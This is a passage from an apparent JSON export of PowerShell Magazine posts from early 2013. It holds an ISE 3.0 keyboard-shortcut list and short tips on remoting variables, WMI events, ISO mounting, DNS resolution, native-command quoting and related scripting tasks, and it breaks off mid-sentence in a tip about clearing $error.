EditorBoxSelectToNextCharacterShortcut Alt+Shift+Right EditorTransposeLineShortcut Alt+Shift+T EditorBoxSelectLineUpShortcut Alt+Shift+Up ToggleVerticalAddOnPaneShortcut Alt+Shift+V EditorSelectPreviousSiblingShortcut Alt+Up ShowScriptPaneTopShortcut Ctrl+1 ShowScriptPaneRightShortcut Ctrl+2 ShowScriptPaneMaximizedShortcut Ctrl+3 EditorSelectAllShortcut Ctrl+A ZoomIn1Shortcut Ctrl+Add EditorMoveCurrentLineToBottomShortcut Ctrl+Alt+End EditorMoveCurrentLineToTopShortcut Ctrl+Alt+Home EditorDeleteWordToLeftShortcut Ctrl+Backspace StopExecutionShortcut Ctrl+Break StopAndCopyShortcut Ctrl+C GoToConsoleShortcut Ctrl+D EditorDeleteWordToRightShortcut Ctrl+Del EditorScrollDownAndMoveCaretIfNecessaryShortcut Ctrl+Down EditorMoveToEndOfDocumentShortcut Ctrl+End FindShortcut Ctrl+F ShowCommandShortcut Ctrl+F1 CloseScriptShortcut Ctrl+F4 GoToLineShortcut Ctrl+G ReplaceShortcut Ctrl+H EditorMoveToStartOfDocumentShortcut Ctrl+Home GoToEditorShortcut Ctrl+I Copy2Shortcut Ctrl+Ins ShowSnippetShortcut Ctrl+J EditorMoveToPreviousWordShortcut Ctrl+Left ToggleOutliningExpansionShortcut Ctrl+M ZoomOut3Shortcut Ctrl+Minus NewScriptShortcut Ctrl+N OpenScriptShortcut Ctrl+O GoToMatchShortcut Ctrl+Oem6 ZoomIn3Shortcut Ctrl+Plus ToggleScriptPaneShortcut Ctrl+R EditorMoveToNextWordShortcut Ctrl+Right SaveScriptShortcut Ctrl+S ZoomIn2Shortcut Ctrl+Shift+Add GetCallStackShortcut Ctrl+Shift+D EditorSelectToEndOfDocumentShortcut Ctrl+Shift+End RemoveAllBreakpointsShortcut Ctrl+Shift+F9 HideHorizontalAddOnToolShortcut Ctrl+Shift+H EditorSelectToStartOfDocumentShortcut Ctrl+Shift+Home ListBreakpointsShortcut Ctrl+Shift+L EditorSelectToPreviousWordShortcut Ctrl+Shift+Left ZoomOut4Shortcut Ctrl+Shift+Minus StartPowerShellShortcut Ctrl+Shift+P ZoomIn4Shortcut Ctrl+Shift+Plus NewRemotePowerShellTabShortcut Ctrl+Shift+R EditorSelectToNextWordShortcut Ctrl+Shift+Right ZoomOut2Shortcut Ctrl+Shift+Subtract EditorMakeUppercaseShortcut Ctrl+Shift+U HideVerticalAddOnToolShortcut Ctrl+Shift+V IntellisenseShortcut Ctrl+Space ZoomOut1Shortcut Ctrl+Subtract NewRunspaceShortcut Ctrl+T EditorMakeLowercaseShortcut Ctrl+U EditorScrollUpAndMoveCaretIfNecessaryShortcut Ctrl+Up Paste1Shortcut Ctrl+V CloseRunspaceShortcut Ctrl+W Cut1Shortcut Ctrl+X EditorRedoShortcut1 Ctrl+Y EditorUndoShortcut1 Ctrl+Z F1KeyboardDisplayName F1 HelpShortcut F1 StepOverShortcut F10 F10KeyboardDisplayName F10 StepIntoShortcut F11 F11KeyboardDisplayName F11 F12KeyboardDisplayName F12 F2KeyboardDisplayName F2 FindNextShortcut F3 F3KeyboardDisplayName F3 F4KeyboardDisplayName F4 RunScriptShortcut F5 F5KeyboardDisplayName F5 F6KeyboardDisplayName F6 F7KeyboardDisplayName F7 RunSelectionShortcut F8 F8KeyboardDisplayName F8 F9KeyboardDisplayName F9 ToggleBreakpointShortcut F9 EditorDeleteCharacterToLeftShortcut Shift+Backspace Cut2Shortcut Shift+Del EditorSelectLineDownShortcut Shift+Down EditorSelectToEndOfLineShortcut Shift+End EditorInsertNewLineShortcut Shift+Enter StepOutShortcut Shift+F11 FindPreviousShortcut Shift+F3 StopDebuggerShortcut Shift+F5 EditorSelectToStartOfLineShortcut Shift+Home Paste2Shortcut Shift+Ins EditorSelectToPreviousCharacterShortcut Shift+Left EditorSelectPageDownShortcut Shift+PgDn EditorSelectPageUpShortcut Shift+PgUp EditorSelectToNextCharacterShortcut Shift+Right EditorSelectLineUpShortcut Shift+Up ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/29/the-complete-list-of-powershell-ise-3-0-keyboard-shortcuts/","tags":["How To","Tips and Tricks"],"title":"The complete list of PowerShell ISE 3.0 keyboard shortcuts"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhen working in the ISE editor you sometimes need to rearrange lines of code and move them below or above other lines. The natural process is to highlight a line, cut it, move your cursor position to another position and then paste.\nIn ISE 3.0 there’s a hidden keyboard shortcut that can save you a lot of key strokes and make the process a lot easier. Consider the following content. You want to move the first line two lines below.\nAll you need to do is place your cursor anywhere inside the first line and press the Alt+Shift+T key combination twice. Try it.\nUnfortunately, you can only swap lines in one direction only, from top to bottom. There is no keyboard shortcut to do the opposite.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/28/pstip-transposing-lines-in-powershell-ise/","tags":["Tips and Tricks"],"title":"#PSTip Transposing lines in PowerShell ISE"},{"categories":["Tips and Tricks"],"contents":"There are multiple ways to verify if a folder exists or not in PowerShell. The below two are my favorite ways of doing it.\n Using the System.IO.Directory .NET namespace  [System.IO.Directory]::Exists($foldername)  The Exists() method returns True if the item specified is a directory and exists. I often use this method in the ValidateScript of PowerShell advanced functions inPowerShell 2.0 and above.\nUsing Test-Path cmdlet in PowerShell  Test-Path $foldername -PathType Container  The Test-Path cmdlet returns True if and only if the specified path is a directory and exists.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/25/pstip-validate-if-a-folder-exists/","tags":["Tips and Tricks"],"title":"#PSTip Validate if a folder exists"},{"categories":["Tips and Tricks"],"contents":"Windows XP and above allow multiple user accounts to be created on the computer. When the computer is in a workgroup mode and there’s more than one user account defined on that system, Windows will display a Welcome Screen with all available user accounts (as picture icons) , so users can click them to log in into the system.\nSometimes however, you will not want to display that list and expose the users on that machine. Using a simple Registry hack you can hide any user account from the Welcome Screen.\nHiding a user is just a matter of adding a new DWord value with the name of the user, User1, and setting its value to ‘0’:\n$path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' New-Item $path -Force | New-ItemProperty -Name User1 -Value 0 -PropertyType DWord -Force  Next time you visit the Welcome Screen, it will look like:\nTo unhide the account, delete the value (or set the value to 1)\nRemove-ItemProperty $path -Name User1 -Force   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/24/pstip-hide-users-from-welcome-screen/","tags":["Tips and Tricks"],"title":"#PSTip Hide users from Welcome Screen"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nPassing local variables to a remote session has become a lot easier in PowerShell 3.0 compared to previous versions. Let’s have a look at a few examples. Consider the following variables defined in your local PowerShell session:\n$a = 'PowerShell' $b = 'Rocks'  If you want to use these variables in a remote session, you will see that the following will not work:\n$a = 'PowerShell' $b = 'Rocks' Invoke-Command -ComputerName Server01 -ScriptBlock { Write-Output The value of variable a is: $a Write-Output The value of variable b is: $b } The value of $a is: The value of $b is: In PowerShell 2.0 we had two options in order to pass our local variables to the remote session. The first option was to pass on the variables to the –ArgumentList parameter. We then had to pick them up from the $args array, and keep track of the order we passed the variables in. For example, the first variable specified on the –ArgumentList parameter could be picked up accessing $args[0], the second variable accessing $args[1], and so on. As we can see in the following example:\nInvoke-Command -ComputerName Server01 -ScriptBlock { Write-Output The value of variable a is: $($args[0]) Write-Output The value of variable b is: $($args[1]) } -ArgumentList $a,$b The value of $a is: PowerShell The value of $b is: Rocks The second option was to use the –ArgumentList parameter and a param block:\nInvoke-Command -ComputerName Server01 -ScriptBlock { param ($first,$second) Write-Output The value of variable a is: $first Write-Output The value of variable b is: $second } -ArgumentList $a,$b The value of $a is: PowerShell The value of $b is: Rocks In PowerShell 3.0 we can simply use the Using scope modifier followed by a colon and the name of the local variable we want to reference:\nInvoke-Command -ComputerName Server01 -ScriptBlock { Write-Output The value of variable a is: $using:a Write-Output The value of variable b is: $using:b } The value of $a is: PowerShell The value of $b is: Rocks ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/23/pstip-passing-local-variables-to-a-remote-session-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Passing local variables to a remote session in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"If you list the Environment drive, you’ll find a variable called SESSIONNAME. SESSIONNAME is defined only if the Terminal Services system component is installed.\nPS\u0026gt; Get-ChildItem env:\\s* Name Value ---- ----- SystemDrive C: SystemRoot C:\\Windows SESSIONNAME Console The value of the variable is set to ‘Console’ which means that you’re currently running directly on the local machine. However, when you initiate a remote desktop session to another machine, the value of the variable will be different, such as: ‘RDP-Tcp#0’.\nBased on that, we can determine if our code is running inside a remote desktop session.\nif($env:SESSIONNAME -eq 'Console') { Write-Host \u0026quot;You are running on the local machine.\u0026quot; } else { Write-Host \u0026quot;You are in a Remote desktop session ('$env:SESSIONNAME').\u0026quot; } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/22/pstip-how-do-i-determine-if-my-script-is-running-in-a-rdp-session/","tags":["Tips and Tricks"],"title":"#PSTip How do I determine if my script is running in a RDP session?"},{"categories":["Tips and Tricks"],"contents":"On one of the PowerShell forums someone asked for help with getting the 15 most used words in a webpage. The core of the answer to that question is amazingly clever use of a hash table.\nPS\u0026gt; $wordList = 'three','three','one','three','two','two' PS\u0026gt; $wordStatistic = $wordList | ForEach-Object -Begin { $wordCounts=@{} } -Process { $wordCounts.$_++ } -End { $wordCounts } PS\u0026gt; $wordStatistic Name Value ---- ----- one 1 three 3 two 2 The result correctly states that the word ‘three’ occurs in the word list three times, the ‘two’ is there two times, and the ‘one’, not surprisingly, once.\nTo understand how the trick works let’s go through it step by step. The first word in the $wordList array – the word ‘three’ – is passed down the pipeline. The $wordCounts hash table, created in the Begin block, is queried for key named ‘three’, in our case represented by the current object in pipeline variable $_. The value of the key value pair named ‘three’ is increased by one using the increment operator ‘++’. If the key is not present in the hash table it is automatically created. One by one the _ForEach-Object_ loop processes all the words in the array incrementing appropriate key by one on each iteration. To complete the task you simply output each key-value pair of the _$wordStatistic_ hash table using the _GetEnumerator()_ method, sort them by the _Value_ property, and select just the most used words, in our case just one.\n$wordStatistic.GetEnumerator() | Sort-Object -Property Value -Descending | Select-Object -First 1 Name Value ---- ----- three 3 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/21/pstip-count-occurrences-of-a-word-using-a-hash-table/","tags":["Tips and Tricks"],"title":"#PSTip Count occurrences of a word using a hash table"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, I showed you how to get the item count in an enumeration. In this tip, we shall see how to retrieve a random item from an enumeration.\nAdd-Type -AssemblyName System.Drawing $count = [Enum]::GetValues([System.Drawing.KnownColor]).Count [System.Drawing.KnownColor](Get-Random -Minimum 1 -Maximum $count) Simple!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/18/pstip-get-a-random-item-from-an-enumeration/","tags":["Tips and Tricks"],"title":"#PSTip Get a random item from an enumeration"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nI recently got a couple of Blink(1)s and started exploring how I can use them in PowerShell. If I have to describe blink(1) in a single line, it is a USB LED that responds to programmed events by blinking in whatever color we specify.\nWhile working with this, I was exploring how I can use the [System.Drawing.KnownColor] enumeration. So, one of the items on my list was to find the count of items in this enumeration.\nSo, this is how I did that:\nAdd-Type -AssemblyName System.Drawing [Enum]::GetValues([System.Drawing.KnownColor]).Count  In the next tip, I will show how I used this count value to retrieve a random item from the enumeration.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/17/pstip-get-the-count-of-items-in-an-enumeration/","tags":["Tips and Tricks"],"title":"#PSTip Get the count of items in an enumeration"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nYou may want to check if a provided file/folder path is relative or absolute and perform appropriate action based on the result. The System.IO.Path namespace provides the IsPathRooted() static method. This method will return True if the path is absolute and False if it is relative. The usage of this is quite simple.\n[System.IO.Path]::IsPathRooted(\"../Scripts\")  This will result in $false as the path we provided is a relative path.\nThis is useful especially when we are validating function parameters. You can just use this as a part of ValidateScript attribute:\nfunction Test-AbsolutePath { Param ( [Parameter(Mandatory=$True)] [ValidateScript({[System.IO.Path]::IsPathRooted($_)})] [String]$Path ) #.... # Your script logic here }  When you use the ValidateScript attribute in the function parameters, the value of -Path is first validated to check if the path is absolute or not before running the actual function code.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/16/pstip-check-if-the-path-is-relative-or-absolute/","tags":["Tips and Tricks"],"title":"#PSTip Check if the path is relative or absolute"},{"categories":["Tips and Tricks","WMI"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIf you are familiar with Windows Management Instrumentation (WMI), there are different types of WMI queries possible. This includes data, event, and schema queries. In the context of today’s tip, we shall look at event queries. WMI events occur when a change happens in the WMI namespace being monitored. When an event that can be monitored by WMI occurs, an instance of the corresponding WMI event class is created, modified, or deleted. Starting PowerShell 2.0, we can use the Register-WmiEvent cmdlet to subscribe to WMI events. We can use the _-Class _parameter to specify a WMI event class to subscribe to. For example, Win32_ProcessStartTrace and Win32_LocalTime are WMI event classes while Win32_Process is not.\nAs you see above, we see an error when the WMI class is not an event class. In fact, not all WMI classes are WMI event classes. So, how do we know which WMI classes are event classes? Get-WmiObject -Query \"SELECT * FROM meta_class WHERE __This ISA '__Event'\"  Simple! You can further filter this to show only Win32 WMI classes:\nGet-WmiObject -Query \"SELECT * FROM meta_class WHERE (__This ISA '__Event') AND (__Class like 'win32%')\"   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/15/pstip-list-all-wmi-event-classes/","tags":["Tips and Tricks","WMI"],"title":"#PSTip List all WMI event classes"},{"categories":["News"],"contents":" Chosen from all products reviewed, tested, worked with, explored, and relied on throughout the year, InfoWorld\u0026rsquo;s Technology of the Year Award winners represent the best of the best for end-users, developers, IT pros, and the businesses they serve. They’re not just the best products we\u0026rsquo;ve seen, but the most innovative, timely, and fun. They’re the ones we don’t want to imagine living without.\n Congratulations, Windows PowerShell is one of the InfoWorld’s 2013 Technology of the Year Award winners!\nYou can read more about it here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/15/windows-powershell-2013-technology-of-the-year-award-winner/","tags":["News"],"title":"Windows PowerShell – 2013 Technology of the Year Award winner"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe PowerShell ISE 3.0 brought a lot of new features. One of them is the ability to hide parts of the code by folding them. The foldable code is marked by small minus/plus signs and can easily fold and unfold by clicking the sign.\nIn this example the parts of the code were marked for folding automatically, but it is also possible to manually define a foldable region. To mark start of the region use ‘#region’ keyword optionally followed by name. To mark the end use simply #endregion. In the following example I define one around all the function definitions to hide them easily:\nIt is also possible to add name of the region you are ending after the #endregion comment, but keep in mind the name is in this case just a memo, not part of the syntax. See the following example:\nI am trying to end the region ‘one’ before the region ‘two’ ended, but regardless of the name specified the region called two is terminated.\nAnother thing to keep in mind is the #region and #endregion are case sensitive in the PowerShell ISE; specifying #Region or #endRegion unfortunately won’t work. PowerGUI and PowerShell Plus are more forgiving as they don’t care about the case.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/14/pstip-use-custom-regions-to-fold-code-in-powershell-ise-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Use custom regions to fold code in PowerShell ISE 3.0"},{"categories":["News"],"contents":"Microsoft released Windows PowerShell 3.0 Language specification to the public. This is a 334 pages of documentation and has tons of information on how the language is implemented. This specification is made available as part of the Microsoft Open Specifications program.\nThis specification defines the PowerShell language, the built-in cmdlets, and the use of objects via the pipeline. You can download the PowerShell 3.0 Language Specification @ http://www.microsoft.com/en-us/download/details.aspx?id=36389\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/11/windows-powershell-3-0-language-specification-available-for-download/","tags":["News"],"title":"Windows PowerShell 3.0 language specification available for download"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen a session is being debugged, PowerShell populates an automatic variable called _$PSDebugContext _which contains an object that has Breakpoints and InvocationInfo properties information about the debugging environment. Visually you can see this by looking at the prompt. In debugging mode, “[DBG]” is added to the prompt:\n[DBG] PS C:\\\u0026gt;  If you need to detect this programatically, you can use the Test-Path cmdlet and check for the existence of the variable . If _$PSDebugContext _exists (not $null), you are in debugging mode.\nPS\u0026gt; Test-Path Variable:PSDebugContext   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/10/pstip-how-can-i-determine-if-im-in-debugging-mode/","tags":["Tips and Tricks"],"title":"#PSTip How can I determine if I’m in debugging mode?"},{"categories":["News"],"contents":"In the scenic setting of the Museum for Industrial and Social History in Oberhausen, Germany, the first German PowerShell Community Conference will take place on April 10 and 11, 2013.\nLeading experts like Dr. Holger Schwichtenberg (MVP .NET Framework), Peter Monadjemi and Dr. Tobias Weltner (MVP PowerShell) will present topics from the field and development, and will be available for questions and discussions. A separate pre-conference prep course will be available for those who did not yet have the time to dive into PowerShell that much.\nMore information and booking is available at www.powershell.de/konferenz. Please note that this is a German-speaking event.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/09/powershell-conference-in-germany/","tags":["News","Conferences"],"title":"PowerShell conference in Germany"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 1.0 or above.\nIn an earlier tip, we showed you how to resolve IP addresses using WMI. In PowerShell, there is always more than one way to achieve anything. So, in today’s tip, let us see how to use System.Net.Dns .NET class to achieve the same. In this .NET class, the GetHostEntry() method can be used to resolve IP address to host name and vice versa.\nHere is how we use this method.\nPS\u0026gt; [Net.DNS]::GetHostEntry(\u0026quot;server01\u0026quot;) HostName Aliases AddressList -------- ------- ----------- server01 {} {192.94.21.28} PS C:\\\u0026gt; [Net.DNS]::GetHostEntry(\u0026quot;192.94.21.28\u0026quot;) HostName Aliases AddressList -------- ------- ----------- server01 {} {} ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/08/pstip-resolving-an-ip-address-to-host-name-and-vice-versa-using-net/","tags":["Tips and Tricks"],"title":"#PSTip Resolving an IP Address to host name and vice versa using .NET"},{"categories":["Tips and Tricks","WMI"],"contents":"When we need to resolve addresses, we usually use the System.Net.Dns .NET class methods. In addition to the .NET method, we can also use WMI class–Win32_PingStatus–to achieve this. The Test-Connection cmdlet is great for checking if a host is up. You can pass a name or an IP address and send ICMP echo request packets (“pings”) to one or more computers. When you ping using a name, the result also includes its IP address.\nPS\u0026gt; Test-Connection -ComputerName LOKI -Count 1 Source Destination IPV4Address IPV6Address Bytes Time(ms) ------ ----------- ----------- ----------- ----- -------- SHAYPC LOKI 10.10.10.10 32 0 However, when you use an IP, you don’t get back the name. Test-Connection relies on the Win32_PingStatus class. There is an option available on the class properties to resolve the name. Once we set the ResolveAddressNames property to True, an attempt to resolve the address is made_._ If it succeeds, _ _the _ProtocolAddressResolved_ property is populated with the name of the target.\nPS\u0026gt; Get-WmiObject Win32_PingStatus -Filter \u0026quot;Address='10.10.10.10' AND ResolveAddressNames='true'\u0026quot; | Select-Object IPV4Address,ProtocolAddressResolved IPV4Address ProtocolAddressResolved ----------- ----------------------- 10.10.10.10 LOKI It would be great if the Test-Connection cmdlet had a _ResolveAddressNames _switch parameter instead of having to craft a WMI request. Like the idea? Would you like to see this in future releases of PowerShell? Add your vote to this suggestion.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/07/pstip-resolving-ip-addresses-with-wmi/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Resolving IP addresses with WMI"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThere are times where you’ll want to determine if the session your code is running in is a remoting session. For a quick test you can check the value of $Host.Name. If it’s ServerRemoteHost, you are in a remote session (works in v2.0). For a more robust solution you can use the existence of the $PSSenderInfo variable (exist in v2.0). From about_Automatic_Variables:\n$PSSenderInfo Contains information about the user who started the PSSession, including the user identity and the time zone of the originating computer. This variable is available only in PSSessions. The $PSSenderInfo variable includes a user-configurable property, ApplicationArguments, which, by default, contains only the $PSVersionTable from the originating session. To add data to the ApplicationArguments property, use the ApplicationArguments parameter of the New-PSSessionOption cmdlet. Here we connect to a remote server and we’re also adding out our own custom value to the $PSSenderInfo variable.\nWe’re using the new inline syntax, available in PowerShell 3.0, to create a new session object, which is passing a new value (in the form of a hash table) that will be stored in the $PSSenderInfo variable. Once we connect to the remote computer, we can check its value. In addition to the default content of $PSSenderInfo, we can also find our custom value:\nPS\u0026gt; Enter-PSSession Thor -SessionOption @{ApplicationArguments=@{MyKey=\u0026quot;MyValue\u0026quot;}} [Thor]: PS C:\\Users\\psmag\u0026amp;gt; $PSSenderInfo.ApplicationArguments Name Value ---- ----- PSVersionTable {CLRVersion, WSManStackVersion, PSVersion, BuildVersion...} MyKey MyValue [Thor]: PS C:\\Users\\psmag\u0026amp;gt; $PSSenderInfo.ApplicationArguments.MyKey MyValue ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/04/pstip-how-can-i-tell-if-im-in-a-remote-powershell-session/","tags":["Tips and Tricks"],"title":"#PSTip How can I tell if I’m in a remote PowerShell session?"},{"categories":["Tips and Tricks","WMI"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nWhen running long running scripts, we prefer to log the activities performed to a log file. By the very nature of these tasks, you may find yourself in a situation where you need to truncate the log file and start writing to a new log location or completely stop logging when we find that the log is becoming larger than it should be. This is usually done to preserve the readability of the log files and also, in some cases, to ensure we don’t use up all available disk space.\nThere is no built-in cmdlet to do this. But, thankfully, WMI provides events we can use to achieve this. Let us see how:\n$query = \u0026quot;Select * from __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'CIM_DataFile' AND TargetInstance.Name='C:\\\\Logs\\\\test.log'\u0026quot; Register-WmiEvent -Query $query -Action { Write-Host \u0026quot;Current file size is: \u0026quot; $Event.SourceEventArgs.NewEvent.TargetInstance.FileSize $prevSize = $Event.SourceEventArgs.NewEvent.PreviousInstance.FileSize $curSize = $Event.SourceEventArgs.NewEvent.TargetInstance.FileSize if ($curSize -gt $prevSize) { $bytes = $curSize - $prevSize Write-Host \u0026quot;File grew by: $bytes bytes\u0026quot; } else { $bytes = $prevSize - $curSize Write-Host \u0026quot;File reduced by: $bytes bytes\u0026quot; } } In the above snippet, we used CIM_DataFile WMI class to monitor the changes made to a log file at C:\\Logs\\test.log. The WMI events contain two instances of the WMI class we are looking at. This includes a PreviousInstance and a TargetInstance — which represents the most up-to-date instance. The CIM_DataFile class provides a property called FileSize which can be used to determine (using the Previous and Target instances) whether the file grew in size or reduced.\nWhen this registered WMI event triggers, we can see the changes to the file size at the console.\nAlthough we used a simple Write-Host method to show the file size changes, in a proper implementation we may want to use the decision block to perform something like truncating the existing log file, etc.\nMake a note that the event subscriptions made using Register-WMIEvent cmdlet are temporary subscriptions. This means that whatever action we have defined in the script block won’t be executed once the PowerShell host is closed. However, you can use WMI Permanent event consumers to use WMI events irrespective of the PowerShell host state.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/03/pstip-monitor-file-growth-using-wmi/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Monitor file growth using WMI"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 and Windows 8 or above.\nStarting with Windows 8, mounting virtual hard disks or ISO files is not an issue anymore. The operation is built into the system. When mounted, a virtual hard disk or ISO file gets a drive letter assigned to it and it appears as a normal disk drive in Windows Explorer. To mount ISO files, simply double click them. To dismount, right click the drive and chose ‘Eject’.\nIn PowerShell, we can manage those drives via the Storage module and its *-DiskImage cmdlets. For example, to mount an ISO image:\nPS\u0026gt; Mount-DiskImage -ImagePath 'D:\\ISO\\en_windows_8_ent_x64.iso' -PassThru Attached : False BlockSize : 0 DevicePath : FileSize : 3490912256 ImagePath : D:\\ISO\\en_windows_8_ent_x64.iso LogicalSectorSize : 2048 Number : Size : 3490912256 StorageType : 1 PSComputerName : By default, Mount-DiskImage does not generate any output, so add the PassThru switch to get a result.\nPS\u0026gt; Dismount-DiskImage -ImagePath 'D:\\ISO\\en_windows_8_ent_x64.iso' -PassThru Attached : True BlockSize : 0 DevicePath : \\\\.\\CDROM1 FileSize : 3490912256 ImagePath : D:\\ISO\\en_windows_8_ent_x64.iso LogicalSectorSize : 2048 Number : 1 Size : 3490912256 StorageType : 1 PSComputerName : How about getting a list of mounted files? Let’s try the Get-DiskImage cmdlet.\nPS\u0026gt; Get-DiskImage cmdlet Get-DiskImage at command pipeline position 1 Supply values for the following parameters: ImagePath[0]: Bummer! Instead of getting mounted images we are prompted to enter the path of the image file! So, to bypass that annoying request and get the images we get a list of volumes and pipe them to the Get-DiskImage cmdlet:\nPS\u0026gt; Get-Volume | Get-DiskImage Attached : True BlockSize : 0 DevicePath : \\\\.\\CDROM1 FileSize : 3618824192 ImagePath : D:\\ISO\\en_windows_8_ent_x64.iso LogicalSectorSize : 2048 Number : 1 Size : 3618824192 StorageType : 1 PSComputerName : Attached : True BlockSize : 0 DevicePath : \\\\.\\CDROM2 FileSize : 3490912256 ImagePath : D:\\ISO\\mu_exchange_server_2013_x64.iso LogicalSectorSize : 2048 Number : 2 Size : 3490912256 StorageType : 1 PSComputerName : If you take a second look at the output of each command you will notice that the result doesn’t reflect the action of the command. The output shows the state of the image object before it has been mounted or dismounted. There’s an open bug report on Connect if you want to vote on it.\nFinally, using that trick we can quickly dismount all mounted (iso based) drives:\nPS\u0026gt; Get-Volume | Get-DiskImage | Dismount-DiskImage  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/02/pstip-working-with-iso-files/","tags":["Tips and Tricks"],"title":"#PSTip Working with ISO files"},{"categories":["How To"],"contents":"Every now and then I find myself facing task I am not sure how to solve using without using native commands. Just writing the native command followed by its parameters in PowerShell host and hitting Enter is usually not enough to run the command successfully. There are several ways to make the command work, let me show you the one I found most convenient.\nIn my examples I am going to use ‘icacls‘, native command that allows you to set file permissions easily. I don’t want to make any changes to your current files so first create a temporary file using technique shown in this tip and save its path into the $path variable.\nPS\u0026gt; $path = [IO.Path]::GetTempFileName()  Next run the command as you would in Windows Command line to see it raise an exception in PowerShell:\nPS\u0026gt; icacls $path /grant Administrators:(D,WDAC) At line:1 char:38 + icacls $path /grant Administrators:(D,WDAC) + ~ Missing argument in parameter list. + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : MissingArgument  To be able to run the command in PowerShell host successfully you need to put the problematic statement in single quotes like this:\nPS\u0026gt; icacls $path /grant 'Administrators:(D,WDAC)' processed file: C:\\Users\\mo\\AppData\\Local\\Temp\\tmpE4F2.tmp Successfully processed 1 files; Failed processing 0 files  Figuring out what must be put in single quotes can get tiresome, but fortunately there is way to automate it with function like this:\nfunction Invoke-NativeExpression { param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true,Position=0)] [string]$Expression ) process { $executable,$arguments = $expression -split ' ' $arguments = $arguments | foreach {\u0026quot;'$_'\u0026quot;} $arguments = $arguments -join ' ' $command = $executable + ' ' + $arguments if ($command) { Write-Verbose \u0026quot;Invoking '$command'\u0026quot; Invoke-Expression -command $command } } }  The function converts the original expression to this format executable ‘argument1’ ‘argument2 and passes it to the Invoke-Expression cmdlet.\nUsing the shown function the native command can be called as such:\nPS\u0026gt; \"icacls $path /grant Administrators:(D,WDAC)\" | Invoke-NativeExpression processed file: C:\\Users\\mo\\AppData\\Local\\Temp\\tmpE4F2.tmp Successfully processed 1 files; Failed processing 0 files  You can also pass the command as named parameter or by position. Making calling the native commands easy.\nIn PowerShell 3.0, there is a new symbol called the stop-parsing symbol (–%) that makes using native commands a little easier. The –% symbol prevents PowerShell from parsing anything until the end of the line enabling you to call the command like this:\nPS\u0026gt; Icacls $path --% /grant Administrators:(D,WDAC)  Notice that you must place the symbol after all the variables that should be expanded, in this case $path, making this approach applicable only in some cases. If you are finished playing with the temporary file you can delete it by this command:\nPS\u0026gt; Remove-Item -Force -Path $path  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/02/calling-native-commands-from-powershell/","tags":["How To"],"title":"Calling native commands from PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nPowerShell has the $error automatic variable. It contains a collection of the errors that occurred while the PowerShell engine has been running. The collection in $error is an instance of System.Collections.ArrayList. The most recent error is the first error object in a collection–$Error[0]. The number of errors that are retained is controlled by the $MaximumErrorCount preference variable (set to 256 by default). You can increase that number up to 32768, but that would increase the memory usage as well. Default value is usually big enough.\nWhat to do if you want to clean out all the entries in $error? $error is a variable, so you can try with the Clear-Variable cmdlet:\nPS\u0026gt; Clear-Variable error -Force Clear-Variable : Cannot overwrite variable Error because it is read-only or constant.  Unfortunately, that doesn’t work even when you use the -Force parameter.\n$error is also an object, 